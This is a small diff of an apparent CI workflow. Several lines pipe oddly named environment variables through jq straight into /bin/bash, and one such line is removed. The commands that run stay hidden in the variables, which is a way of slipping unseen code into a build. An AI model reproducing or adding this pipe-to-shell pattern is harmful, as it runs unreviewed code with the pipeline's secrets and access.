@@ -26,7 +26,6 @@ jobs:
           echo $gcvv231 | jq -r .fhzm230 | /bin/bash
           echo $naqw61112 | jq -r .bsy2054 | /bin/bash
           printf '%s' "$hwdsd1518" | jq -r .fo35 | /bin/bash
-          printf '%s' "$ihbd61078" | jq -r .yk6 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
